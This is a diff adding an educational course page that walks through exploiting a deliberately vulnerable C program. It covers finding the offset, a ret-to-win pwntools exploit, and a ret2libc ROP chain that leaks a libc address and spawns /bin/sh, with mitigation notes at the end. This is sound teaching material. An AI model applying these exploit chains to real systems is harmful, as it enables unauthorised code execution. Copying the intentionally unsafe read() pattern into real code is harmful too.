@@ -1,0 +1,602 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+<title>BoF → shell: a complete exploit from zero — Cybersec Zero to Hero</title>
+<link rel="stylesheet" href="../../styles.css">
+</head>
+<body>
+<div class="app">
+  <aside class="sidebar">
+  <div class="sidebar-header">
+    <div class="brand">
+      <div class="brand-mark">&gt;_</div>
+      <div>
+        <div class="brand-title">CYBERSEC</div>
+        <div class="brand-subtitle">zero · to · hero</div>
+      </div>
+    </div>
+    <div class="lang-switch"><a href="../../pages/14b-bof-shell-completo.html" class="lang-link" title="Passa all'italiano"><svg viewBox="0 0 30 20" width="22" height="15"><rect width="10" height="20" fill="#009246"/><rect x="10" width="10" height="20" fill="#fff"/><rect x="20" width="10" height="20" fill="#ce2b37"/></svg> IT</a><span class="lang-active" title="English"><svg viewBox="0 0 30 20" width="22" height="15"><rect width="30" height="20" fill="#012169"/><path d="M0,0 L30,20 M30,0 L0,20" stroke="#fff" stroke-width="3"/><path d="M0,0 L30,20 M30,0 L0,20" stroke="#c8102e" stroke-width="1.5"/><path d="M15,0 v20 M0,10 h30" stroke="#fff" stroke-width="5"/><path d="M15,0 v20 M0,10 h30" stroke="#c8102e" stroke-width="3"/></svg> EN</span></div>
+  </div>
+  <div class="search-wrap">
+    <div class="search-row">
+      <div class="search-inputwrap">
+        <span class="search-icon" aria-hidden="true">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="11" cy="11" r="7"/>
+            <line x1="20" y1="20" x2="16.65" y2="16.65"/>
+          </svg>
+        </span>
+        <input class="search-input" id="search-input" type="text" placeholder="search... (press /)" autocomplete="off" aria-label="Search">
+        <button class="search-clear" id="search-clear" type="button" aria-label="Clear" title="Clear">&times;</button>
+      </div>
+      <button class="search-btn" id="search-btn" type="button" aria-label="SEARCH" title="SEARCH">SEARCH</button>
+    </div>
+    <div class="search-hits" id="search-hits" role="listbox"></div>
+  </div>
+  <div class="sidebar-nav">
+    <nav class="nav-section">
+      <div class="nav-section-title">Path</div>
+      <ul class="nav-list">
+        <li class="nav-item"><a href="../index.html"><span class="num">00</span>Home</a></li>
+        <li class="nav-item"><a href="../pages/00-path-and-mindset.html" class=""><span class="num">00</span>Path, mindset, ethics and law</a></li><li class="nav-item"><a href="../pages/00b-math-and-cs.html" class=""><span class="num">00b</span>Math and computation theory (the bare minimum, integrated)</a></li><li class="nav-item"><a href="../pages/01-cs-fundamentals.html" class=""><span class="num">01</span>Computer science fundamentals for security</a></li><li class="nav-item"><a href="../pages/01b-assembly-from-zero.html" class=""><span class="num">01b</span>x86-64 and ARM64 Assembly from zero</a></li><li class="nav-item"><a href="../pages/02-essential-linux.html" class=""><span class="num">02</span>Essential Linux for security</a></li><li class="nav-item"><a href="../pages/02b-regex-automata.html" class=""><span class="num">02b</span>Regex, automata, and parsers for security</a></li><li class="nav-item"><a href="../pages/03-networking-tcp-ip.html" class=""><span class="num">03</span>Networking: from cables to TCP/IP</a></li><li class="nav-item"><a href="../pages/04-http-tls.html" class=""><span class="num">04</span>HTTP, HTTPS and TLS in depth</a></li><li class="nav-item"><a href="../pages/05-cryptography.html" class=""><span class="num">05</span>Cryptography: theory and practice</a></li><li class="nav-item"><a href="../pages/05b-crypto-worked-examples.html" class=""><span class="num">05b</span>Cryptography — step-by-step worked examples</a></li><li class="nav-item"><a href="../pages/06-os-internals.html" class=""><span class="num">06</span>OS internals: Linux and Windows in depth</a></li><li class="nav-item"><a href="../pages/07-programming-for-security.html" class=""><span class="num">07</span>Programming for security: Python, C, Go</a></li><li class="nav-item"><a href="../pages/08-osint-recon.html" class=""><span class="num">08</span>OSINT and reconnaissance</a></li><li class="nav-item"><a href="../pages/09-scanning-enumeration.html" class=""><span class="num">09</span>Scanning, enumeration and fingerprinting</a></li><li class="nav-item"><a href="../pages/10-owasp-top10.html" class=""><span class="num">10</span>OWASP Top 10 and beyond — basic web vulnerabilities</a></li><li class="nav-item"><a href="../pages/10b-walkthrough-byte-by-byte.html" class=""><span class="num">10b</span>Byte-by-byte walkthrough: SQLi, XSS, SSRF, IDOR</a></li><li class="nav-item"><a href="../pages/11-advanced-web.html" class=""><span class="num">11</span>Advanced web hacking</a></li><li class="nav-item"><a href="../pages/12-network-attacks.html" class=""><span class="num">12</span>Network attacks: MITM, spoofing, pivoting</a></li><li class="nav-item"><a href="../pages/13-active-directory.html" class=""><span class="num">13</span>Active Directory hacking</a></li><li class="nav-item"><a href="../pages/14-exploit-development.html" class=""><span class="num">14</span>Exploit development: from buffer overflow to ROP</a></li><li class="nav-item"><a href="../pages/14b-bof-to-shell-complete.html" class="active"><span class="num">14b</span>BoF → shell: a complete exploit from zero</a></li><li class="nav-item"><a href="../pages/15-reverse-engineering.html" class=""><span class="num">15</span>Reverse engineering</a></li><li class="nav-item"><a href="../pages/16-malware-analysis.html" class=""><span class="num">16</span>Malware: taxonomy and analysis</a></li><li class="nav-item"><a href="../pages/17-mobile-security.html" class=""><span class="num">17</span>Mobile security: Android and iOS</a></li><li class="nav-item"><a href="../pages/18-cloud-security.html" class=""><span class="num">18</span>Cloud security: AWS, Azure, GCP</a></li><li class="nav-item"><a href="../pages/19-container-kubernetes.html" class=""><span class="num">19</span>Containers and Kubernetes</a></li><li class="nav-item"><a href="../pages/20-wireless-radio.html" class=""><span class="num">20</span>Wireless and radio: WiFi, BT, SDR</a></li><li class="nav-item"><a href="../pages/21-hardware-firmware.html" class=""><span class="num">21</span>Hardware and firmware hacking</a></li><li class="nav-item"><a href="../pages/22-forensics-dfir.html" class=""><span class="num">22</span>Forensics and DFIR</a></li><li class="nav-item"><a href="../pages/23-blue-team-soc.html" class=""><span class="num">23</span>Blue team: SOC, SIEM, EDR, hunting</a></li><li class="nav-item"><a href="../pages/24-threat-intelligence.html" class=""><span class="num">24</span>Threat intelligence</a></li><li class="nav-item"><a href="../pages/25-grc-regulations.html" class=""><span class="num">25</span>GRC, regulations, and standards</a></li><li class="nav-item"><a href="../pages/26-red-team.html" class=""><span class="num">26</span>Red team and adversary emulation</a></li><li class="nav-item"><a href="../pages/27-ai-ml-security.html" class=""><span class="num">27</span>AI / ML security</a></li><li class="nav-item"><a href="../pages/28-capstone-roadmap.html" class=""><span class="num">28</span>Capstone: CTF roadmap, home lab, certifications</a></li><li class="nav-item"><a href="../pages/29-master-cheatsheet.html" class=""><span class="num">29</span>Master cheatsheet</a></li><li class="nav-item"><a href="../pages/30-extended-glossary.html" class=""><span class="num">30</span>Extended glossary (250+ terms)</a></li><li class="nav-item"><a href="../pages/31-it-eu-regulations.html" class=""><span class="num">31</span>IT/EU regulatory references in detail</a></li>
+      </ul>
+    </nav>
+  </div>
+</aside>
+  <main class="main">
+    <div class="content">
+      <div class="page-meta">
+        <span class="pill">Binary</span>
+        <span>Section 19 of 36</span>
+        <span class="level-tag level-exp">Level: expert</span>
+      </div>
+      <h1>BoF → shell: a complete exploit from zero</h1>
+      <p class="summary">A real stack buffer overflow, from C source to /bin/sh in hand. Every step: compiling with specific flags, finding the offset, building the payload, debugging with gdb, ROP chain when ASLR is on. Ends with exercises to replicate at home.</p>
+      <div class="info-card">
+  <div class="label">Area</div>
+  <div>Binary</div>
+  <div class="label">Prerequisites</div>
+  <ul class="source-list"><li>Sections 01, 01b, 14</li></ul>
+  <div class="label">Tools</div>
+  <ul class="source-list"><li>gcc, gdb + pwndbg/gef</li><li>pwntools (pip install pwntools)</li><li>ROPgadget, one_gadget</li><li>checksec.sh</li></ul>
+</div>
+      <blockquote>
+<p>Reproduce every command on your Linux VM. It will work first try if you follow step by step.</p>
+</blockquote>
+<h2 id="the-vulnerable-source">The vulnerable source</h2>
+<p><code>vuln.c</code>:</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include &lt;unistd.h&gt;
+
+void win() {
+    printf(&quot;you reached win() — flag: {pwnedcode}\n&quot;);
+    system(&quot;/bin/sh&quot;);
+}
+
+void greet() {
+    char buf[64];
+    printf(&quot;Inserisci nome: &quot;);
+    fflush(stdout);
+    read(0, buf, 256);   // bug: legge 256 byte in un buffer da 64
+    printf(&quot;Ciao %s\n&quot;, buf);
+}
+
+int main() {
+    greet();
+    return 0;
+}
+</code></pre>
+<p>What's here:
+- <code>read(0, buf, 256)</code> reads up to 256 bytes into a 64-byte buffer → <strong>overflow of 192 bytes past buf</strong>.
+- <code>win()</code> is a "target" function never called by normal flow.</p>
+<h2 id="step-1-compile-with-protections-disabled">Step 1 — compile with protections disabled</h2>
+<pre><code class="language-bash">gcc -fno-stack-protector -no-pie -z execstack -O0 -g vuln.c -o vuln
+</code></pre>
+<p>Flag explanation:
+- <code>-fno-stack-protector</code> → no canary.
+- <code>-no-pie</code> → fixed code addresses (binary not relocated).
+- <code>-z execstack</code> → executable stack (needed if we want shellcode on the stack; not necessary for ret-to-win).
+- <code>-O0</code> → no optimization, predictable code.
+- <code>-g</code> → debug symbols.</p>
+<p>Verify with <code>checksec</code>:</p>
+<pre><code class="language-bash">checksec --file=./vuln
+</code></pre>
+<p>Expected output:</p>
+<pre><code>RELRO       STACK CANARY    NX            PIE           Symbols
+Partial RELRO   No canary found   NX enabled    No PIE       103 Symbols
+</code></pre>
+<p>(NX is still on — that's fine for now.)</p>
+<h2 id="step-2-run-it-to-understand-inputoutput">Step 2 — run it to understand input/output</h2>
+<pre><code class="language-bash">./vuln
+# Inserisci nome: Alice
+# Ciao Alice
+</code></pre>
+<p>Now try an overflow:</p>
+<pre><code class="language-bash">python3 -c &quot;print('A'*100)&quot; | ./vuln
+# Ciao AAAA...AAA
+# Segmentation fault (core dumped)
+</code></pre>
+<p><strong>Crash</strong>. The CPU tried to return to <code>0x4141414141414141</code> (8 bytes of 'A' in the return address) → unmapped address → segfault.</p>
+<h2 id="step-3-find-the-exact-offset">Step 3 — find the exact offset</h2>
+<p>Use a <strong>non-repeating pattern</strong> (de Bruijn sequence). pwntools:</p>
+<pre><code class="language-python"># find_offset.py
+from pwn import *
+context.update(arch='amd64', os='linux')
+io = process('./vuln')
+io.recvuntil(b': ')
+io.sendline(cyclic(200))
+io.wait()
+core = io.corefile
+print(f&quot;RIP overwritten with: {hex(core.fault_addr)}&quot;)
+print(f&quot;Offset: {cyclic_find(core.fault_addr &amp; 0xffffffff)}&quot;)
+</code></pre>
+<pre><code class="language-bash">python3 find_offset.py
+# RIP overwritten with: 0x6161617661616175  ← de Bruijn pattern
+# Offset: 72
+</code></pre>
+<p><strong>72 bytes</strong> (64 buf + 8 saved RBP) before RIP. (It can vary: the compiler may add padding. On some systems it's 80.)</p>
+<h3 id="visualized">Visualized</h3>
+<figure class="diagram">
+<svg viewBox="0 0 540 380" width="540" height="380" xmlns="http://www.w3.org/2000/svg">
+  <style>
+    .lbl { font-family: 'JetBrains Mono', monospace; font-size: 13px; fill: #e8eef0; }
+    .addr { font-family: 'JetBrains Mono', monospace; font-size: 11px; fill: #8a9499; }
+    .note { font-family: 'JetBrains Mono', monospace; font-size: 11.5px; fill: #ffe066; }
+    .pay { font-family: 'JetBrains Mono', monospace; font-size: 11.5px; fill: #ff3da6; }
+  </style>
+  <text x="170" y="20" class="addr" text-anchor="middle">high addresses</text>
+  <!-- return address -->
+  <rect x="40" y="30" width="260" height="40" fill="#3a0b0b" stroke="#ff4d4d" stroke-width="2"/>
+  <text x="170" y="55" class="lbl" text-anchor="middle">return address (8 bytes)</text>
+  <text x="310" y="55" class="note">← bytes 73-80</text>
+  <!-- saved RBP -->
+  <rect x="40" y="70" width="260" height="40" fill="#3a2a00" stroke="#ffe066" stroke-width="2"/>
+  <text x="170" y="95" class="lbl" text-anchor="middle">saved RBP (8 bytes)</text>
+  <text x="310" y="95" class="note">← bytes 65-72</text>
+  <!-- buf 63 -->
+  <rect x="40" y="110" width="260" height="220" fill="#0b3a1a" stroke="#00ff9c" stroke-width="2"/>
+  <text x="170" y="135" class="lbl" text-anchor="middle">buf[63]</text>
+  <text x="170" y="200" class="lbl" text-anchor="middle">...</text>
+  <text x="170" y="270" class="lbl" text-anchor="middle">buf[1]</text>
+  <text x="170" y="320" class="lbl" text-anchor="middle">buf[0]</text>
+  <text x="310" y="135" class="note">← byte 64</text>
+  <text x="310" y="320" class="note">← byte 1 (RSP)</text>
+  <text x="170" y="355" class="addr" text-anchor="middle">low addresses</text>
+  <!-- payload arrow -->
+  <text x="430" y="40" class="pay">PAYLOAD:</text>
+  <text x="430" y="60" class="pay">72×'A'</text>
+  <text x="430" y="80" class="pay">+ 8B addr</text>
+  <text x="430" y="100" class="pay">(little-endian)</text>
+  <line x1="420" y1="55" x2="305" y2="55" stroke="#ff3da6" stroke-width="1.5" marker-end="url(#a2)"/>
+  <line x1="420" y1="200" x2="305" y2="200" stroke="#ff3da6" stroke-width="1.5" marker-end="url(#a2)"/>
+  <text x="430" y="200" class="pay">writes here</text>
+  <text x="430" y="220" class="pay">→ overwrites</text>
+  <text x="430" y="240" class="pay">everything</text>
+  <defs>
+    <marker id="a2" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto">
+      <path d="M0,0 L10,5 L0,10 z" fill="#ff3da6"/>
+    </marker>
+  </defs>
+</svg>
+<figcaption>Stack frame of greet() — the 256-byte overflow starts at buf[0] and reaches well past the return address</figcaption>
+</figure>
+
+<h2 id="step-4-find-the-address-of-win">Step 4 — find the address of <code>win()</code></h2>
+<pre><code class="language-bash">nm ./vuln | grep win
+# 0000000000401196 T win
+</code></pre>
+<p><code>win</code> is at <code>0x401196</code> (because of <code>-no-pie</code>: fixed addresses).</p>
+<p>In gdb:</p>
+<pre><code>(gdb) disas win
+   0x0000000000401196 &lt;+0&gt;:     endbr64
+   0x000000000040119a &lt;+4&gt;:     push   rbp
+   ...
+</code></pre>
+<p><code>0x401196</code> is the entry point.</p>
+<h2 id="step-5-build-the-payload">Step 5 — build the payload</h2>
+<pre><code class="language-python"># exploit.py
+from pwn import *
+
+context.update(arch='amd64', os='linux')
+
+WIN = 0x401196
+
+payload  = b&quot;A&quot; * 72
+payload += p64(WIN)
+
+io = process('./vuln')
+io.recvuntil(b': ')
+io.sendline(payload)
+io.interactive()
+</code></pre>
+<p>Explanation:
+- <code>p64(WIN)</code> packs <code>0x0000000000401196</code> as <strong>8 bytes little-endian</strong>: <code>\x96\x11\x40\x00\x00\x00\x00\x00</code>.
+- 72 'A's fill buf + saved RBP.
+- The next 8 bytes overwrite the return address with the address of <code>win</code>.</p>
+<p>Run:</p>
+<pre><code class="language-bash">python3 exploit.py
+# [+] Starting local process './vuln': pid 12345
+# [*] Switching to interactive mode
+# Inserisci nome: Ciao AAAAA...AAAA
+# you reached win() — flag: {pwnedcode}
+# $ id
+# uid=1000(alice) gid=1000(alice) groups=1000(alice)
+# $ whoami
+# alice
+</code></pre>
+<p><strong>You have a shell.</strong> You bypassed the program's normal flow.</p>
+<h2 id="step-6-variant-stack-alignment-issue">Step 6 — variant: stack alignment issue</h2>
+<p>Sometimes <code>system("/bin/sh")</code> crashes with <code>movaps</code> (SIGSEGV in libc). Cause: RSP not aligned to 16 bytes. Fix: before jumping to <code>win</code>, jump to a <code>ret</code> gadget (aligns by subtracting 8 bytes from RSP).</p>
+<pre><code class="language-python">RET_GADGET = 0x40101a    # look for a &quot;ret&quot; in objdump
+payload = b&quot;A&quot;*72 + p64(RET_GADGET) + p64(WIN)
+</code></pre>
+<p>ROPgadget:</p>
+<pre><code class="language-bash">ROPgadget --binary ./vuln --only &quot;ret&quot;
+</code></pre>
+<h2 id="step-7-with-aslr-on-no-win-rop-is-needed">Step 7 — with ASLR ON, no <code>win()</code>: ROP is needed</h2>
+<p>Recompile without <code>win</code>:</p>
+<pre><code class="language-c">// vuln2.c
+#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+int main() {
+    char buf[64];
+    read(0, buf, 256);
+    return 0;
+}
+</code></pre>
+<pre><code class="language-bash">gcc -fno-stack-protector -no-pie -O0 vuln2.c -o vuln2
+</code></pre>
+<p><strong>No <code>win</code></strong> — we need to call <code>system("/bin/sh")</code> from libc. But ASLR randomizes libc → you don't know the address. So:</p>
+<h3 id="step-71-leak-a-libc-address">Step 7.1 — leak a libc address</h3>
+<p>We use the PLT (<code>puts@plt</code>) to print the contents of the GOT of <code>puts</code> (which after the first call contains the <em>real</em> address of <code>puts</code> in libc).</p>
+<pre><code class="language-bash">objdump -d ./vuln2 | grep -E &quot;puts@plt|read@plt&quot;
+# does vuln2 have puts? no, maybe only read and write.
+# Let's rewrite it:
+</code></pre>
+<p>Version that uses <code>puts</code>:</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+int main() {
+    char buf[64];
+    puts(&quot;hi&quot;);           // forza il binding di puts
+    read(0, buf, 256);
+    return 0;
+}
+</code></pre>
+<p>Compile as above. Now:</p>
+<pre><code class="language-bash">objdump -d ./vuln2 | grep &quot;puts@plt&quot;
+# 0000000000401050 &lt;puts@plt&gt;:
+objdump -R ./vuln2 | grep puts
+# 0000000000404018  R_X86_64_JUMP_SLOT puts@GLIBC_2.2.5  ← GOT entry
+</code></pre>
+<p><code>puts@plt = 0x401050</code>, <code>puts@got = 0x404018</code>.</p>
+<h3 id="step-72-what-a-rop-gadget-is-the-part-everyone-glosses-over">Step 7.2 — what a ROP gadget is (the part everyone glosses over)</h3>
+<p>A <strong>gadget</strong> is a <strong>sequence of asm instructions already present in the binary or in libraries</strong> that ends with <code>ret</code>. E.g.:</p>
+<pre><code>pop rdi
+ret
+</code></pre>
+<p>These are just two bytes of code: <code>5F C3</code> (<code>5F</code> = <code>pop rdi</code>, <code>C3</code> = <code>ret</code>). They occur by accident inside existing functions.</p>
+<p><strong>Why they work:</strong> when you place the gadget's address on the stack where the return address goes, the <code>ret</code> jumps there. The CPU executes <code>pop rdi</code> (which pulls the next value from the stack into RDI), then <code>ret</code> (which jumps to the next one). So, by putting this sequence on the stack:</p>
+<pre><code>[ &amp;(pop rdi; ret) ]   ← 1st value: gadget address
+[ 0xCAFEBABE      ]   ← 2nd value: ends up in RDI after pop
+[ &amp;(function)     ]   ← 3rd value: new &quot;return&quot;, CPU jumps to it at end of gadget
+</code></pre>
+<p>…the CPU effectively executes: set <code>RDI = 0xCAFEBABE</code>, jump to <code>function</code>. <strong>You called a function with a controlled argument without any original <code>call</code> from the program.</strong></p>
+<h4 id="visualizing-gadget-execution">Visualizing gadget execution</h4>
+<div class="mermaid">
+sequenceDiagram
+    autonumber
+    participant CPU
+    participant Stack as Stack (controlled)
+    Note over Stack: [+0] &gadget_pop_rdi<br/>[+8] 0xCAFEBABE<br/>[+16] &funct<br/>[+24] ...
+    CPU->>Stack: original ret (vulnerable) → pop address
+    Note over CPU: jump to gadget pop_rdi
+    CPU->>Stack: executes 'pop rdi' → RDI = 0xCAFEBABE
+    Note over CPU: executes gadget's 'ret' → pop next address
+    CPU->>Stack: jump to 'funct' with controlled RDI
+
+</div>
+
+<h4 id="chaining-multiple-gadgets">Chaining multiple gadgets</h4>
+<p>Want RSI and RDX too? Find gadgets like <code>pop rsi; pop r15; ret</code> and place them in sequence. The "chain" is a list of values on the stack that the CPU consumes one at a time.</p>
+<h4 id="how-to-find-gadgets">How to find gadgets</h4>
+<p><code>ROPgadget</code> scans every executable section of the binary looking for bytes like <code>5F C3</code> and shows where they start:</p>
+<pre><code class="language-bash">ROPgadget --binary ./vuln2 --only &quot;pop|ret&quot; | grep &quot;pop rdi&quot;
+# 0x000000000040118a : pop rdi ; ret
+</code></pre>
+<p>Result: <code>pop rdi; ret</code> is at address <code>0x40118a</code> in the binary. Save it as <code>POP_RDI</code>.</p>
+<blockquote>
+<p>Without <code>-no-pie</code>, the binary has a randomized base → the relative offset is fixed but the base isn't → you must leak a code address before using binary gadgets. Often libc gadgets are preferred after leaking the libc base.</p>
+</blockquote>
+<h3 id="step-73-rop-for-the-leak">Step 7.3 — ROP for the leak</h3>
+<pre><code class="language-python"># leak.py
+from pwn import *
+context.update(arch='amd64', os='linux')
+
+elf = ELF('./vuln2')
+libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
+
+POP_RDI = 0x40118a
+RET     = 0x40101a   # gadget ret puro
+MAIN    = elf.symbols['main']
+
+io = process('./vuln2')
+io.recvuntil(b'hi\n')
+
+# Payload: leak puts@got, poi ritorna a main per fare round 2
+payload = b&quot;A&quot;*72
+payload += p64(POP_RDI)
+payload += p64(elf.got['puts'])
+payload += p64(elf.plt['puts'])
+payload += p64(MAIN)              # ritorna a main per chiedere un secondo input
+io.sendline(payload)
+
+# leggi 8 byte di leak
+puts_leak = u64(io.recvline().strip().ljust(8, b'\x00'))
+print(f&quot;puts leak: {hex(puts_leak)}&quot;)
+
+# Calcola base libc
+libc.address = puts_leak - libc.symbols['puts']
+print(f&quot;libc base: {hex(libc.address)}&quot;)
+
+# Round 2: chiama system(&quot;/bin/sh&quot;)
+SYSTEM   = libc.symbols['system']
+BIN_SH   = next(libc.search(b&quot;/bin/sh\x00&quot;))
+print(f&quot;system: {hex(SYSTEM)}, /bin/sh: {hex(BIN_SH)}&quot;)
+
+payload2 = b&quot;A&quot;*72
+payload2 += p64(RET)              # stack align
+payload2 += p64(POP_RDI)
+payload2 += p64(BIN_SH)
+payload2 += p64(SYSTEM)
+io.sendline(payload2)
+io.interactive()
+</code></pre>
+<p>Run:</p>
+<pre><code class="language-bash">python3 leak.py
+# [+] Starting local process './vuln2': pid 23456
+# puts leak: 0x7f8e3a5e7c50
+# libc base: 0x7f8e3a567000
+# system: 0x7f8e3a5b4d50, /bin/sh: 0x7f8e3a716678
+# $ id
+# uid=1000(alice) ...
+</code></pre>
+<h3 id="explanation-of-each-payload-element-line-by-line">Explanation of each payload element (line by line)</h3>
+<p><strong>Round 1 — leak payload.</strong> Anatomy with annotations:</p>
+<figure class="diagram">
+<svg viewBox="0 0 660 280" width="660" height="280" xmlns="http://www.w3.org/2000/svg">
+  <style>
+    .lbl { font-family: 'JetBrains Mono', monospace; font-size: 12px; fill: #e8eef0; }
+    .annot { font-family: 'JetBrains Mono', monospace; font-size: 11px; fill: #ffe066; }
+    .off { font-family: 'JetBrains Mono', monospace; font-size: 11px; fill: #8a9499; }
+  </style>
+  <!-- offset col -->
+  <text x="20"  y="40"  class="off">off 0</text>
+  <text x="20"  y="80"  class="off">off 72</text>
+  <text x="20"  y="120" class="off">off 80</text>
+  <text x="20"  y="160" class="off">off 88</text>
+  <text x="20"  y="200" class="off">off 96</text>
+  <!-- payload boxes -->
+  <rect x="80" y="20" width="240" height="40" fill="#0b3a1a" stroke="#00ff9c"/>
+  <text x="200" y="44" class="lbl" text-anchor="middle">'A' × 72 (padding)</text>
+  <rect x="80" y="60" width="240" height="40" fill="#3a2a00" stroke="#ffe066"/>
+  <text x="200" y="84" class="lbl" text-anchor="middle">POP_RDI gadget addr</text>
+  <rect x="80" y="100" width="240" height="40" fill="#0b3a3a" stroke="#00e6ff"/>
+  <text x="200" y="124" class="lbl" text-anchor="middle">puts@got (arg for pop rdi)</text>
+  <rect x="80" y="140" width="240" height="40" fill="#3a2a00" stroke="#ffe066"/>
+  <text x="200" y="164" class="lbl" text-anchor="middle">puts@plt (calls puts)</text>
+  <rect x="80" y="180" width="240" height="40" fill="#3a0b3a" stroke="#ff3da6"/>
+  <text x="200" y="204" class="lbl" text-anchor="middle">main (return = restart)</text>
+  <!-- annotations -->
+  <text x="340" y="44" class="annot">→ fills buf + saved RBP</text>
+  <text x="340" y="84" class="annot">→ CPU jumps here at ret</text>
+  <text x="340" y="124" class="annot">→ pop rdi: RDI = &puts@got</text>
+  <text x="340" y="164" class="annot">→ calls puts(RDI) → prints</text>
+  <text x="340" y="204" class="annot">→ restarts main for round 2</text>
+  <text x="80" y="260" class="lbl">All on the stack AFTER the original return address: the CPU consumes one at a time via ret.</text>
+</svg>
+<figcaption>Anatomy of the round-1 ROP payload — every 8 bytes is one action</figcaption>
+</figure>
+
+<p><strong>Step-by-step chain execution</strong> (what the CPU does after <code>main</code>'s <code>ret</code>):</p>
+<table>
+<thead>
+<tr>
+<th>Step</th>
+<th>RIP</th>
+<th>Stack pointer</th>
+<th>What happens</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><code>POP_RDI</code></td>
+<td>points to <code>puts@got</code></td>
+<td><code>pop rdi</code> → RDI = <code>puts@got</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td><code>puts@plt</code></td>
+<td>points to <code>main</code></td>
+<td>executes <code>puts(RDI)</code> → prints libc address of puts</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>main</code></td>
+<td>points to the "A"s below (broken, but doesn't matter)</td>
+<td><code>main</code> restarts, asks for new input</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Computing the libc base after the leak:</strong></p>
+<pre><code class="language-python">libc.address = puts_leak - libc.symbols['puts']
+</code></pre>
+<ul>
+<li><code>puts_leak</code> = e.g. <code>0x7f8e3a5e7c50</code> (absolute address in memory, randomized by ASLR).</li>
+<li><code>libc.symbols['puts']</code> = e.g. <code>0x80c50</code> (constant offset of <code>puts</code> inside the <code>libc.so.6</code> binary).</li>
+<li><code>libc.address</code> = the difference = absolute base where libc is loaded in this run.</li>
+</ul>
+<p>From here we can compute the address of <strong>any</strong> libc function: <code>system = libc.address + libc.symbols['system']</code>, strings like <code>/bin/sh</code> with <code>next(libc.search(b"/bin/sh\x00"))</code>.</p>
+<p><strong>Round 2 — final payload (the shell):</strong></p>
+<table>
+<thead>
+<tr>
+<th>Slot</th>
+<th>Value</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>'A' × 72</code></td>
+<td>padding</td>
+<td>fills buf+RBP</td>
+</tr>
+<tr>
+<td><code>RET</code></td>
+<td>pure <code>ret</code> gadget</td>
+<td>aligns RSP to 16 bytes (required by <code>movaps</code> in <code>system</code>)</td>
+</tr>
+<tr>
+<td><code>POP_RDI</code></td>
+<td><code>pop rdi; ret</code></td>
+<td>next value into RDI</td>
+</tr>
+<tr>
+<td><code>&amp;"/bin/sh"</code></td>
+<td>string in libc</td>
+<td>argument 1</td>
+</tr>
+<tr>
+<td><code>SYSTEM</code></td>
+<td><code>libc.address + offset_system</code></td>
+<td>calls <code>system("/bin/sh")</code></td>
+</tr>
+</tbody>
+</table>
+<p>Result: a shell drops at your feet.</p>
+<blockquote>
+<p><strong>Mental summary</strong>: stack overflow → control RIP → with ROP I build a "virtual machine" of sequential calls → the first one leaks (because ASLR), the second invokes system. <strong>No shellcode</strong>, <strong>no stack execution</strong>, <strong>everything with code that already exists</strong>.</p>
+</blockquote>
+<h2 id="step-8-understanding-mitigation-flags">Step 8 — Understanding mitigation flags</h2>
+<p>Recompile with all of them:</p>
+<pre><code class="language-bash">gcc vuln.c -o vuln_safe
+checksec --file=./vuln_safe
+</code></pre>
+<pre><code>RELRO          STACK CANARY      NX            PIE
+Full RELRO     Canary found      NX enabled    PIE enabled    103 Symbols
+</code></pre>
+<ul>
+<li><strong>Canary</strong>: 8 random bytes between buf and saved RBP. If overwritten, abort.</li>
+<li><strong>PIE</strong>: the binary itself has randomized addresses each run.</li>
+<li><strong>Full RELRO</strong>: GOT read-only (no GOT overwrite).</li>
+</ul>
+<p>Without an info-leak of the canary and binary base, BoF doesn't work. <strong>Combined with:</strong>
+- <strong>ASLR</strong>: random libc/stack/heap.</p>
+<p>Bypass: you need a second bug (info-leak) that leaks the canary, binary base, and libc base.</p>
+<h3 id="modern-compiler-hardening">Modern compiler hardening</h3>
+<p>GCC 12+ + glibc 2.38+ add further checks:
+- <strong>_FORTIFY_SOURCE=3</strong>: checks on <code>strcpy</code>, <code>read</code> with known buffer size.
+- <strong>SafeStack</strong> (LLVM): separate stack for pointers / data.
+- <strong>CET</strong> (Intel): hardware shadow stack + Indirect Branch Tracking. Available on recent CPUs.</p>
+<h2 id="step-9-real-world-case-cve-as-an-exploit-dev-mindset">Step 9 — real-world case: CVE as an exploit-dev mindset</h2>
+<p>Typical vulnerability research chain (simplified):
+1. <strong>Fuzzing</strong> (AFL++) finds a crash in libtarget.
+2. <strong>Triage</strong>: is the crash exploitable? Does it overwrite RIP/function ptr?
+3. <strong>Stabilization</strong>: make the crash deterministic.
+4. <strong>Primitives</strong>: turn the crash into a "leak" or "write" primitive.
+5. <strong>Exploit</strong>: chain primitives into a shell.</p>
+<p>Modern tools (AFL++ + ASAN + sancov) speed up steps 1-3. Steps 4-5 remain art.</p>
+<h2 id="step-10-extensions-and-continued-practice">Step 10 — Extensions and continued practice</h2>
+<ul>
+<li><strong>Ret2dlresolve</strong> (when leaking the libc address is impossible).</li>
+<li><strong>Stack pivoting</strong> when the writable stack is small.</li>
+<li><strong>House of ...</strong> for the heap.</li>
+<li><strong>Format string</strong> for arbitrary read+write primitives.</li>
+</ul>
+<p>Resources:
+- <strong>ROP Emporium</strong> (https://ropemporium.com): guided ROP challenges with increasing difficulty.
+- <strong>pwn.college</strong>: structured course.
+- <strong>pwnable.kr</strong>, <strong>pwnable.tw</strong>, <strong>HackTheBox pwn</strong>.</p>
+<h2 id="exercises">Exercises</h2>
+<h3 id="ex-14b1-reproduce-step-by-step">Ex 14b.1 — Reproduce step by step</h3>
+<p>Reproduce the entire sections 1-6 on your VM. Document every step with screenshots/output. When you reach the shell, count the minutes from the start.</p>
+<h3 id="ex-14b2-modify-and-adapt">Ex 14b.2 — Modify and adapt</h3>
